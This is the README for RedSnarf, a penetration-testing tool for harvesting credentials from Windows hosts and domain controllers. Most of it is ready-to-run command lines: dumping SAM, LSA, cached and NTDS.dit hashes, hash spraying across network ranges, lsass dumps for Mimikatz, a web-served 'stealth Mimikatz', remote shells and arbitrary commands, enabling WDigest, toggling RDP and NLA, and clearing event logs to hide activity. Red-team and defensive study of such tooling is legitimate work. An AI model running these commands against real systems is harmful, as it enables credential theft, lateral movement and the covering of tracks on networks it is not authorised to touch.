     ______           .____________                     _____  
\______   \ ____   __| _/   _____/ ____ _____ ________/ ____\ 
 |       _// __ \ / __ |\_____  \ /    \\__  \\_  __ \   __\  
 |    |   \  ___// /_/ |/        \   |  \/ __ \|  | \/|  |    
 |____|_  /\___  >____ /_______  /___|  (____  /__|   |__|    
        \/     \/     \/       \/     \/     \/         

RedSnarf is a pen-testing / red-teaming tool by Ed William and Richard Davy for retrieving hashes and credentials from Windows workstations, servers and domain controllers using OpSec Safe Techniques.

RedSnarf functionality includes: 

•	Retrieval of local SAM hashes;
•	Enumeration of user/s running with elevated system privileges and their corresponding lsa secrets password;
•	Retrieval of MS cached credentials;
•	Pass-the-hash;
•	Quickly identify weak and guessable username/password combinations (default of administrator/Password01);
•	The ability to retrieve hashes across a range;
•	Hash spraying - 
o	Credsfile will accept a mix of pwdump, fgdump and plain text username and password separated by a space;
•	Lsass dump for offline analysis with Mimikatz;
•	Dumping of Domain controller hashes using NTDSUtil and retrieval of NTDS.dit for local parsing;
•	Dumping of Domain controller hashes using the drsuapi method;
•	Retrieval of Scripts and Policies folder from a Domain controller and parsing for 'password' and 'administrator';
•	Ability to decrypt cpassword hashes;
•	Ability to start a shell on a remote machine;
•	The ability to clear the event logs (application, security, setup or system); (Internal Version only)
•	Results are saved on a per-host basis for analysis.
•	Enable/Disable RDP on a remote machine.
•	Enable/Disable NLA on a remote machine.
•	Find where users are logged in on remote machines.
•	Stealth mimikatz added.

RedSnarf Usage
=======================

Requirements:
Impacket v0.9.16-dev - https://github.com/CoreSecurity/impacket.git
CredRetrieve 7 - https://github.com/Neohapsis/credRetrieve7
Lsass Retrieval using procdump - https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx
Netaddr (0.7.12) - easy_install install netaddr
Termcolor (1.1.0) - easy_install termcolor
iconv - used with parsing Mimikatz info locally 

Show Help
./redsnarf.py -h
./redsnarf.py --help

Retrieve Local Hashes
=======================

Retrieve Local Hashes from a single machine using weak local credetials and clearing the Security event log
./redsnarf.py -H ip=10.0.0.50 -s security

Retrieve Local Hashes from a single machine using weak local credetials and clearing the application event log
./redsnarf.py -H ip=10.0.0.50 -s application

Retrieve Local Hashes from a single machine using local administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D .

Retrieve Local Hashes from a single machine using domain administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com

Retrieve Hashes across a network range using local administrator credentials
./redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -D .

Retrieve Hashes across a network range using domain administrator credentials
./redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -D yourdomain.com

Retrieve Hashes across a network range using domain administrator credentials
./redsnarf.py -H file=targets.txt -u administrator -p Password01 -D yourdomain.com

Hash Spraying
=======================

Spray Hashes across a network range 
./redsnarf.py -H range=10.0.0.1/24 -C credsfile -D .

Retrieve Hashes across a network range domain login
./redsnarf.py -H range=10.0.0.1/24 -C credsfile -D yourdomain.com

Retrieve Domain Hashes
=======================

Retrieve Hashes using drsuapi method (Quickest)
./redsnarf.py -H ip=10.0.0.1 -u administrator -p Password01 -D yourdomain.com -i y

Retrieve Hashes using NTDSUtil
./redsnarf.py -H ip=10.0.0.1 -u administrator -p Password01 -D yourdomain.com -n y

Stealth Mimikatz (spins a web server - serves powershell and executes
=======================
./redsnarf.py -H ip=192.168.198.136 -Sy -sy

Information Gathering
=======================

Copy the Policies and Scripts folder from a Domain Controller and parse for password and administrator
./redsnarf.py -H ip=10.0.0.1 -u administrator -p Password01 -D yourdomain.com -P y

Decrypt Cpassword
./redsnarf.py -g cpassword

Find User - Live
/redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -D yourdomain.com -F user.name

Find User - Offline (searches pre downloaded information)
/redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -D yourdomain.com -f user.name


Misc
=======================

Start a Shell on a machine using local administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D . -d y

Start a Shell on a machine using domain administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -d y

Retrieve a copy of lsass for offline parsing with Mimikatz on a machine using local administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D . -l y

Run Custom Command
Example 1
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -x 'net user'

Example 2 - Double Quotes need to be escaped with \
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -x 'dsquery group -name \"domain admins\" | dsget group -members -expand'

Local Access Token Policy
Creates a batch file lat.bat which you can copy and paste to the remote machine to execute which will modify the registry and either enable or disable Local Access Token Policy settings.
./redsnarf.py -L y

Wdigest
Enable UseLogonCredential Wdigest registry value on a machine using domain administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -W e

Disable UseLogonCredential Wdigest registry value on a machine using domain administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -W d

Query UseLogonCredential Wdigest registry value on a machine using domain administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -W q

RDP
=======================

RDP
Enable RDP on a machine using domain administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -R e

Disable RDP on a machine using domain administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -R d

Query RDP status on a machine using domain administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -R q

Change RDP Port from 3389 to 443 - Change RDP Port to 443 on a machine using domain administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -t e

Change RDP Port to default of 3389 on a machine using domain administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -t d

Query RDP Port Value on a machine using domain administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -t q

NLA
=======================

Enable NLA on a machine using domain administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -r e

Disable NLA on a machine using domain administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -r d

Query NLA status on a machine using domain administrator credentials
./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -r q
